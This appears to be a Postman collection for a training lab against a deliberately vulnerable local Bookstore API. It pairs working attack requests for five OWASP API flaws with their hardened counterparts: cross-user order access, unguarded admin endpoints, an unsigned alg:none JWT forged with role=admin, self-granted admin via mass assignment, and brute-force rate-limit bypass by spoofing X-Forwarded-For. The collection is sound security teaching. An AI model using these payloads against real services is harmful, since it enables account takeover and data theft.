@@ -1,0 +1,269 @@
+{
+  "info": {
+    "name": "VulnAPI-Lab — Attack & Verify Collection",
+    "_postman_id": "vulnapi-lab-001",
+    "description": "18 requests demonstrating 5 OWASP API Security Top 10 vulnerabilities in the fake Bookstore API. Run vuln server on :3000, hardened on :3001.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "base_vuln",     "value": "http://localhost:3000" },
+    { "key": "base_hardened", "value": "http://localhost:3001" },
+    { "key": "alice_token",   "value": "" },
+    { "key": "bob_token",     "value": "" },
+    { "key": "eve_token",     "value": "" }
+  ],
+  "item": [
+    {
+      "name": "0 — Setup",
+      "item": [
+        {
+          "name": "Check mode (vulnerable)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/",
+            "description": "Confirms VULN_MODE=true is active. Should list all 5 vulnerabilities."
+          }
+        },
+        {
+          "name": "Login as Alice",
+          "event": [{
+            "listen": "test",
+            "script": { "exec": [
+              "pm.test('status 200', () => pm.response.to.have.status(200));",
+              "pm.collectionVariables.set('alice_token', pm.response.json().token);"
+            ], "type": "text/javascript" }
+          }],
+          "request": {
+            "method": "POST",
+            "url": "{{base_vuln}}/api/auth/login",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": { "mode": "raw", "raw": "{\"username\":\"alice\",\"password\":\"alice123\"}" }
+          }
+        },
+        {
+          "name": "Login as Bob",
+          "event": [{
+            "listen": "test",
+            "script": { "exec": [
+              "pm.test('status 200', () => pm.response.to.have.status(200));",
+              "pm.collectionVariables.set('bob_token', pm.response.json().token);"
+            ], "type": "text/javascript" }
+          }],
+          "request": {
+            "method": "POST",
+            "url": "{{base_vuln}}/api/auth/login",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": { "mode": "raw", "raw": "{\"username\":\"bob\",\"password\":\"bob123\"}" }
+          }
+        },
+        {
+          "name": "Get book catalog",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/books",
+            "description": "Public endpoint — no auth needed."
+          }
+        }
+      ]
+    },
+    {
+      "name": "1 — BOLA (OWASP API1)",
+      "item": [
+        {
+          "name": "1a. Alice fetches her own order (OK)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/orders/1",
+            "header": [{ "key": "Authorization", "value": "Bearer {{alice_token}}" }],
+            "description": "Expected: 200 — Alice owns order 1."
+          }
+        },
+        {
+          "name": "1b. Alice fetches BOB's order (BOLA)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/orders/2",
+            "header": [{ "key": "Authorization", "value": "Bearer {{alice_token}}" }],
+            "description": "VULN: Expected 403, gets 200 with Bob's data. No ownership check."
+          }
+        },
+        {
+          "name": "1c. [Hardened] Alice fetches Bob's order (BLOCKED)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_hardened}}/api/orders/2",
+            "header": [{ "key": "Authorization", "value": "Bearer {{alice_token}}" }],
+            "description": "FIX: Returns 403 Forbidden. Order.user_id checked against JWT sub."
+          }
+        }
+      ]
+    },
+    {
+      "name": "2 — Broken Function-Level Auth (OWASP API5)",
+      "item": [
+        {
+          "name": "2a. Bob (user) accesses admin user list (VULN)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/admin/users",
+            "header": [{ "key": "Authorization", "value": "Bearer {{bob_token}}" }],
+            "description": "VULN: Returns full user table to a non-admin. Missing requireAdmin middleware."
+          }
+        },
+        {
+          "name": "2b. Bob (user) accesses admin order list (VULN)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/admin/orders",
+            "header": [{ "key": "Authorization", "value": "Bearer {{bob_token}}" }],
+            "description": "VULN: Returns all orders from all users."
+          }
+        },
+        {
+          "name": "2c. [Hardened] Bob hits admin endpoint (BLOCKED)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_hardened}}/api/admin/users",
+            "header": [{ "key": "Authorization", "value": "Bearer {{bob_token}}" }],
+            "description": "FIX: Returns 403. requireAdmin checks role === 'admin'."
+          }
+        }
+      ]
+    },
+    {
+      "name": "3 — JWT alg:none bypass (OWASP API2)",
+      "item": [
+        {
+          "name": "3a. Forge admin token (alg=none)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/admin/users",
+            "header": [{
+              "key": "Authorization",
+              "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXJuYW1lIjoiYm9iIiwicm9sZSI6ImFkbWluIiwiaWF0Ijo5OTk5OTk5OTk5fQ.",
+              "description": "Header={alg:none} Payload={role:admin} Signature=empty"
+            }],
+            "description": "VULN: Unsigned forged token with role=admin is accepted. Decode at jwt.io to inspect."
+          }
+        },
+        {
+          "name": "3b. [Hardened] Forged token rejected",
+          "request": {
+            "method": "GET",
+            "url": "{{base_hardened}}/api/admin/users",
+            "header": [{
+              "key": "Authorization",
+              "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXJuYW1lIjoiYm9iIiwicm9sZSI6ImFkbWluIiwiaWF0Ijo5OTk5OTk5OTk5fQ."
+            }],
+            "description": "FIX: 401 — algorithms:['HS256'] rejects any other alg including none."
+          }
+        }
+      ]
+    },
+    {
+      "name": "4 — Mass Assignment (OWASP API6)",
+      "item": [
+        {
+          "name": "4a. Register as admin via mass assignment (VULN)",
+          "event": [{
+            "listen": "test",
+            "script": { "exec": [
+              "if (pm.response.code === 201) {",
+              "  pm.collectionVariables.set('eve_token', pm.response.json().token);",
+              "}"
+            ], "type": "text/javascript" }
+          }],
+          "request": {
+            "method": "POST",
+            "url": "{{base_vuln}}/api/auth/register",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"eve\",\"password\":\"eve123\",\"email\":\"eve@evil.dev\",\"role\":\"admin\"}"
+            },
+            "description": "VULN: role:admin from request body is inserted directly. Eve is now admin."
+          }
+        },
+        {
+          "name": "4b. Confirm Eve has admin role",
+          "request": {
+            "method": "GET",
+            "url": "{{base_vuln}}/api/admin/users",
+            "header": [{ "key": "Authorization", "value": "Bearer {{eve_token}}" }],
+            "description": "Should return user list — confirming Eve's self-elevated role works."
+          }
+        },
+        {
+          "name": "4c. [Hardened] Mass assignment blocked",
+          "request": {
+            "method": "POST",
+            "url": "{{base_hardened}}/api/auth/register",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"eve2\",\"password\":\"eve123\",\"email\":\"eve2@evil.dev\",\"role\":\"admin\"}"
+            },
+            "description": "FIX: role field is ignored. Account created with role=user always."
+          }
+        }
+      ]
+    },
+    {
+      "name": "5 — Rate-Limit bypass (OWASP API4)",
+      "item": [
+        {
+          "name": "5a. Normal login (attempt 1 of 5)",
+          "request": {
+            "method": "POST",
+            "url": "{{base_vuln}}/api/auth/login",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "X-Forwarded-For", "value": "10.0.0.1" }
+            ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"admin\",\"password\":\"wrong\"}" },
+            "description": "Attempt 1 — should get 401 wrong password."
+          }
+        },
+        {
+          "name": "5b. Attempt 6 with same IP (should be blocked)",
+          "request": {
+            "method": "POST",
+            "url": "{{base_vuln}}/api/auth/login",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "X-Forwarded-For", "value": "10.0.0.1" }
+            ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"admin\",\"password\":\"wrong\"}" },
+            "description": "Attempt 6 with same IP — rate limiter should return 429."
+          }
+        },
+        {
+          "name": "5c. Attempt 6 with DIFFERENT spoofed IP (bypass!)",
+          "request": {
+            "method": "POST",
+            "url": "{{base_vuln}}/api/auth/login",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "X-Forwarded-For", "value": "10.0.0.99" }
+            ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"admin\",\"password\":\"supersecret\"}" },
+            "description": "VULN: Changing X-Forwarded-For resets the rate limit. Gets 200 on attempt 'infinity'."
+          }
+        },
+        {
+          "name": "5d. [Hardened] Spoofed IP does not bypass limiter",
+          "request": {
+            "method": "POST",
+            "url": "{{base_hardened}}/api/auth/login",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "X-Forwarded-For", "value": "10.0.0.99" }
+            ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"admin\",\"password\":\"wrong\"}" },
+            "description": "FIX: Uses req.socket.remoteAddress. Spoofed header is irrelevant."
+          }
+        }
+      ]
+    }
+  ]
+}
